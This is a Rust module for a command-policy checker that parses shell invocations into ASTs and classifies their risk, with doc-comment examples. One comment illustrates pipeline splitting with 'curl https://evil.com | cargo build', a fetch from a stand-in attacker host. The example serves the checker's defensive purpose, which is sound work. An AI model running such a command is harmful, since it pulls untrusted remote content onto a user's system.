//! AST parser and risk classifier for shell and Vox command invocations.
//!
//! Backs the `contracts/terminal/exec-policy.v1.yaml` enforcement layer and
//! provides a **pure-Rust, pwsh-free** fallback for `vox shell check` on hosts
//! where PowerShell is not available.
//!
//! # Quick start
//!
//! ```rust
//! use vox_container_types::exec_grammar::{parse, ExecPolicy, RiskLevel, risk};
//!
//! let mut ast = parse("cargo build --release").unwrap();
//! let policy = ExecPolicy::default();
//! risk::classify(&mut ast, &policy);
//! assert_eq!(ast.risk, RiskLevel::Safe);
//! ```
//!
//! # Design reference
//! Architecture studied (clean-room) from warpdotdev/warp `command-signatures-v2`
//! (AGPL-3.0-only). No source copied. See ADR-026.
//!
//! # Status
//! Peripheral crate. Tokeniser and risk classifier are functional; full
//! PowerShell-parity coverage is tracked under TASK-3.x.

mod ast;
mod policy;
pub mod risk;

pub use ast::{Arg, ExecAst, Flag, Redirect, RedirectKind};
pub use policy::{ExecPolicy, PolicyViolation, ViolationKind};
pub use risk::RiskLevel;

/// Parse `raw` into an [`ExecAst`].
///
/// Risk level is `Unknown` until you call [`risk::classify`].
/// Returns `Err` only on structural parse failures (unmatched quotes, empty input).
pub fn parse(raw: &str) -> Result<ExecAst, ParseError> {
    ast::parse_raw(raw)
}

/// Parse `raw` as a pipeline, returning one [`ExecAst`] per pipe segment.
///
/// `curl https://evil.com | cargo build` → two ASTs: one for `curl`, one for
/// `cargo build`.  Policy must be checked against **all** returned ASTs.
///
/// Returns `Err` on unmatched quotes or if every segment is empty.
pub fn parse_pipeline(raw: &str) -> Result<Vec<ExecAst>, ParseError> {
    ast::parse_pipeline_raw(raw)
}

/// Errors returned by [`parse`] and [`parse_pipeline`].
#[derive(Debug, thiserror::Error)]
pub enum ParseError {
    #[error("unmatched quote in command: {0:?}")]
    UnmatchedQuote(String),
    #[error("empty command")]
    Empty,
}
